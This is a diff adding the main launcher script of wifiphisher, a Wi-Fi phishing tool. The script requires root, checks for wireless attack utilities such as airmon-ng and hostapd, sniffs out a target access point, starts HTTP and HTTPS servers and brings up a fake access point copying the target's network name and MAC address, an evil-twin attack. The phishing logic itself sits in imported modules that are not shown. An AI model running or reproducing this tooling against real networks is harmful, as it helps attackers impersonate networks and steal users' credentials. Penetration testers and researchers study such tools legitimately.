@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+import os
+import sys
+import subprocess
+from wifiphisher.config import Config
+from wifiphisher.sniffing import Sniffing
+from wifiphisher.webserver import WebServer
+from wifiphisher.accesspoint import AccessPoint
+
+def check_dep(prog):
+    try:
+        p = subprocess.Popen(['which', prog], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        p.wait()
+    except OSError:
+        sys.exit('which is not installed on your system\n')
+    if p.returncode != 0:
+        sys.exit('%s: is not installed on your system\n' % prog)
+
+if __name__ == '__main__':
+    # check if root
+    if os.geteuid():
+        sys.exit('[-] Run as root')
+    # check system deps
+    check_dep('iwconfig')
+    check_dep('airmon-ng')
+    check_dep('ifconfig')
+    check_dep('ip')
+    check_dep('iw')
+    check_dep('hostapd')
+    check_dep('dnsmasq')
+    check_dep('iwlist')
+    # imports
+    conf = Config()
+    sniff = Sniffing()
+    ap = AccessPoint()
+    web = WebServer()
+    # find target access point
+    channel, essid, mac = sniff.find_target_ap(conf.monitor_iface)
+    # start web servers
+    web.start_http_server(conf.http_port)
+    web.start_https_server(conf.ssl_port)
+    # start fake access point
+    ap.start_access_point(conf.monitor_iface, conf.ap_address, conf.ap_range,
+        channel, essid, mac)
